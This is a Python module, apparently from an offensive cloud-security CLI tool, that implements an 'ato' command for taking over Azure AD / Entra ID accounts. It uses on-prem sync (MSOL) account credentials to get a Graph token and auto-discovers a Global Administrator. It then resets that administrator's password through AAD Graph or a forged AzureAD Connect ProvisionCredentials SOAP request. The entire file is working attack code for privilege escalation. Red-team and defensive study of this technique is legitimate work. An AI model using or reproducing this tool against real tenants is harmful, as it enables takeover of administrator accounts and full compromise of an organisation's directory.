import typer
import httpx
import uuid
import secrets
import string
from datetime import datetime, timezone

from ._shared import azsync_app, console
from entruder.static import HTTP_TIMEOUT
from entruder.utils import handle_cli_errors, require_tenant, request_json, parse_error, decode_jwt
from . import _wcf


def acquire_graph_token(tenant, username, password, client_id):
    """Authenticate the on-prem sync (MSOL) account and get an Azure AD Graph token.

    Sync accounts are excluded from Conditional Access and MFA, so a plain
    resource-owner password (ROPC) grant works, which is what AADInternals'
    Get-AccessTokenForAADGraph does. Resource is graph.windows.net; the same
    token is accepted by both AAD Graph and the AzureAD Connect sync API.
    """
    result = request_json(
        "POST",
        f"https://login.microsoftonline.com/{tenant}/oauth2/token",
        data={
            "grant_type": "password",
            "resource": "https://graph.windows.net",
            "client_id": client_id,
            "username": username,
            "password": password,
            "scope": "openid",
        },
    )
    token = result.get("access_token")
    if not token:
        message = result.get("error_description") or result.get("error") or str(result)
        raise ValueError(f"Sync account authentication failed: {parse_error(message)}")
    return token


# roleTemplateId of the built-in Global Administrator (a.k.a. Company
# Administrator) directory role — stable across every tenant.
GLOBAL_ADMIN_ROLE_TEMPLATE = "62e90394-69f5-4237-9190-012177145e10"


def discover_global_admin(token, tenant):
    headers = {"Authorization": f"Bearer {token}"}

    roles = request_json(
        "GET",
        f"https://graph.windows.net/{tenant}/directoryRoles",
        params={"api-version": "1.6"},
        headers=headers,
    )
    role_id = next(
        (r.get("objectId") for r in roles.get("value", [])
         if r.get("roleTemplateId") == GLOBAL_ADMIN_ROLE_TEMPLATE),
        None,
    )
    if not role_id:
        message = roles.get("error_description") or roles.get("error") or "Global Administrator role not activated in this tenant"
        raise ValueError(f"Could not resolve the Global Administrator role: {parse_error(str(message))}")

    members = request_json(
        "GET",
        f"https://graph.windows.net/{tenant}/directoryRoles/{role_id}/members",
        params={"api-version": "1.6"},
        headers=headers,
    )
    users = [m for m in members.get("value", []) if m.get("objectType") == "User" and m.get("objectId")]
    # prefer an enabled account so we don't waste the reset on a disabled one
    chosen = next((m for m in users if m.get("accountEnabled")), None) or (users[0] if users else None)
    if not chosen:
        raise ValueError("No user members found in the Global Administrator role")
    return chosen["objectId"], chosen.get("userPrincipalName")


def reset_user_password(token, tenant, target_id, new_password):
    response = httpx.patch(
        f"https://graph.windows.net/{tenant}/users/{target_id}",
        params={"api-version": "1.6"},
        json={"passwordProfile": {"password": new_password, "forceChangePasswordNextLogin": False}},
        headers={"Authorization": f"Bearer {token}", "Content-Type": "application/json"},
        timeout=HTTP_TIMEOUT,
    )
    # AAD Graph returns 204 No Content on a successful PATCH.
    if response.status_code not in (200, 204):
        raise ValueError(f"Password reset failed: HTTP {response.status_code} {response.text}")


def resolve_object_id(token, tenant, identifier):
    """Return the directory objectId (GUID) for a UPN or objectId."""
    if "@" not in identifier:
        return identifier  # already an objectId
    result = request_json(
        "GET",
        f"https://graph.windows.net/{tenant}/users/{identifier}",
        params={"api-version": "1.6"},
        headers={"Authorization": f"Bearer {token}"},
    )
    object_id = result.get("objectId")
    if not object_id:
        message = result.get("error_description") or result.get("error") or f"objectId not found for {identifier}"
        raise ValueError(f"Could not resolve objectId: {parse_error(str(message))}")
    return object_id



SYNC_SERVER = "adminwebservice.microsoftonline.com"
SYNC_APP_ID = "1651564e-7ce4-4d99-88be-0a65050d8dc3"
SYNC_CLIENT_VERSION = "8.0"
SYNC_CLIENT_BUILD = "2.2.8.0"
AWS_CHANGE_NS = "http://schemas.microsoft.com/online/aws/change/2010/01"
COEXISTENCE_NS = "http://schemas.datacontract.org/2004/07/Microsoft.Online.Coexistence.Schema"
XSI_NS = "http://www.w3.org/2001/XMLSchema-instance"
ADMIN_SERVICE_NS = "urn:microsoft.online.administrativeservice"


def _sync_envelope(token, command, message_id, body_children, server):
    E = _wcf.Elem
    aws = {"": AWS_CHANGE_NS}
    sync_token = E("SyncToken",
        ns={"": ADMIN_SERVICE_NS, "i": XSI_NS},
        attrs=[("s:role", ADMIN_SERVICE_NS)],
        children=[
            E("ApplicationId", ns=aws, text=SYNC_APP_ID),
            E("BearerToken", ns=aws, text=token),
            E("ClientVersion", ns=aws, text=SYNC_CLIENT_VERSION),
            E("DirSyncBuildNumber", ns=aws, text=SYNC_CLIENT_BUILD),
            E("FIMBuildNumber", ns=aws, text=SYNC_CLIENT_BUILD),
            E("IsInstalledOnDC", ns=aws, text="False"),
            E("IssueDateTime", ns=aws, text="0001-01-01T00:00:00"),
            E("LanguageId", ns=aws, text="en-US"),
            E("LiveToken", ns=aws),
            E("ProtocolVersion", ns=aws, text="2.0"),
            E("RichCoexistenceEnabled", ns=aws, text="False"),
            E("TrackingId", ns=aws, text=message_id),
        ])
    header = E("s:Header", children=[
        E("a:Action", attrs=[("s:mustUnderstand", "1")],
          text=f"{AWS_CHANGE_NS}/IProvisioningWebService/{command}"),
        sync_token,
        E("a:MessageID", text=f"urn:uuid:{message_id}"),
        E("a:ReplyTo", children=[
            E("a:Address", text="http://www.w3.org/2005/08/addressing/anonymous")]),
        E("a:To", attrs=[("s:mustUnderstand", "1")],
          text=f"https://{server}/provisioningservice.svc"),
    ])
    body = E("s:Body", children=body_children)
    return E("s:Envelope",
             ns={"s": "http://www.w3.org/2003/05/soap-envelope",
                 "a": "http://www.w3.org/2005/08/addressing"},
             children=[header, body])


def _provision_credentials_body(cloud_anchor, credential_data, change_date):
    E = _wcf.Elem
    item = E("b:SyncCredentialsChangeItem", children=[
        E("b:ChangeDate", text=change_date),
        E("b:CloudAnchor", text=cloud_anchor),
        E("b:CredentialData", text=credential_data),
        E("b:ForcePasswordChangeOnLogon", text="false"),
        E("b:SourceAnchor", attrs=[("i:nil", "true")]),
        E("b:WindowsLegacyCredentials", attrs=[("i:nil", "true")]),
        E("b:WindowsSupplementalCredentials", attrs=[("i:nil", "true")]),
    ])
    request = E("request", ns={"b": COEXISTENCE_NS, "i": XSI_NS}, children=[
        E("b:RequestItems", children=[item]),
    ])
    return [E("ProvisionCredentials", ns={"": AWS_CHANGE_NS}, children=[request])]


def reset_password_via_sync(token, object_id, new_password, server=SYNC_SERVER, _depth=0):
    command = "ProvisionCredentials"
    message_id = str(uuid.uuid4())
    now = datetime.now(timezone.utc)
    change_date = now.strftime("%Y-%m-%dT%H:%M:%S.") + f"{now.microsecond * 10:07d}Z"
    credential_data = _wcf.create_aad_hash(new_password)
    cloud_anchor = f"User_{object_id}"

    envelope = _sync_envelope(
        token, command, message_id,
        _provision_credentials_body(cloud_anchor, credential_data, change_date),
        server,
    )
    payload = _wcf.encode_document(envelope)

    tid = decode_jwt(token).get("tid", "")
    headers = {
        "x-ms-aadmsods-appid": SYNC_APP_ID,
        "x-ms-aadmsods-apiaction": command,
        "client-request-id": message_id,
        "x-ms-aadmsods-clientversion": SYNC_CLIENT_VERSION,
        "x-ms-aadmsods-dirsyncbuildnumber": SYNC_CLIENT_BUILD,
        "x-ms-aadmsods-fimbuildnumber": SYNC_CLIENT_BUILD,
        "x-ms-aadmsods-tenantid": tid,
        "Content-Type": "application/soap+msbin1",
        "User-Agent": "",
    }
    response = httpx.post(f"https://{server}/provisioningservice.svc",
                          content=payload, headers=headers, timeout=HTTP_TIMEOUT)

    tree = _wcf.parse_binary_response(response.content)

    # The service may redirect to a different sync instance; follow a few hops.
    redirect = tree.find("Url")
    if redirect and redirect.text and _depth < 3:
        return reset_password_via_sync(
            token, object_id, new_password, redirect.text.split("/")[2], _depth + 1)

    err = tree.find("ErrorDescription")
    if err and err.text:
        raise ValueError(f"Sync password reset failed: {err.text}")

    fault = tree.find("Fault")
    if fault:
        reason = tree.find("Text")
        detail = reason.text if reason and reason.text else f"SOAP Fault (HTTP {response.status_code})"
        raise ValueError(f"Sync password reset failed: {detail}")

    result = tree.find("Result")
    if result is not None and (result.text or "").strip() not in ("0", ""):
        raise ValueError(f"Sync password reset returned Result={result.text}")


def _generate_password(length=20):
    classes = [string.ascii_uppercase, string.ascii_lowercase, string.digits, "!@#$%^&*()-_"]
    chars = [secrets.choice(c) for c in classes]
    alphabet = "".join(classes)
    chars += [secrets.choice(alphabet) for _ in range(length - len(chars))]
    for i in range(len(chars) - 1, 0, -1):
        j = secrets.randbelow(i + 1)
        chars[i], chars[j] = chars[j], chars[i]
    return "".join(chars)




@azsync_app.command("ato")
@handle_cli_errors
def azsync_ato(
    tenant: str = typer.Option(..., "-t", "--tenant", help="Tenant ID (or domain) of the target directory (will be cached upon explicit use)"),
    client_id: str = typer.Option("1b730954-1685-4b74-9bfd-dac224a7b894", "-c", "--client-id", help="Public client ID for the ROPC token (Optional, defaults to Azure AD PowerShell) (will be cached upon explicit use)"),
    username: str = typer.Option(..., "-u", "--username", help="UPN of the on-prem sync account (e.g. Sync_HOST_xxxx@tenant.onmicrosoft.com)"),
    password: str = typer.Option(..., "-p", "--password", help="Password of the sync account"),
    ga_id: str = typer.Option(None, "-g", "--ga-id", help="Object ID (or UPN) of the target account to take over (Optional, auto-discovers a Global Administrator if omitted)"),
    new_password: str = typer.Option(None , "-n", "--new-password", help="Password to set on the target (Optional, generated if omitted)"),
    provisioning: bool = typer.Option(False, "-r", "--provisioning", help="Reset via the AzureAD Connect sync API (password-hash sync) instead of Azure AD Graph (works against cloud-only Global Admins that AAD Graph blocks)"),
):
    """Take over a target account (e.g. a Global Admin) by abusing on-prem sync (MSOL) account credentials"""
    tenant = require_tenant(tenant, console)
    if not new_password:
        new_password = _generate_password()

    graph_token = acquire_graph_token(tenant, username, password, client_id)
    console.print(f"[bold green][+][/] Authenticated as sync account {username}")

    ga_upn = None
    if not ga_id:
        ga_id, ga_upn = discover_global_admin(graph_token, tenant)
        label = f"{ga_upn} ({ga_id})" if ga_upn else ga_id
        console.print(f"[bold green][+][/] Auto-discovered Global Administrator: {label}")

    if provisioning:
        object_id = resolve_object_id(graph_token, tenant, ga_id)
        reset_password_via_sync(graph_token, object_id, new_password)
        console.print(f"[bold green][+][/] Password for {ga_upn or object_id} set to: {new_password}")
    else:
        reset_user_password(graph_token, tenant, ga_id, new_password)
        console.print(f"[bold green][+][/] Password for {ga_id} set to: {new_password}")
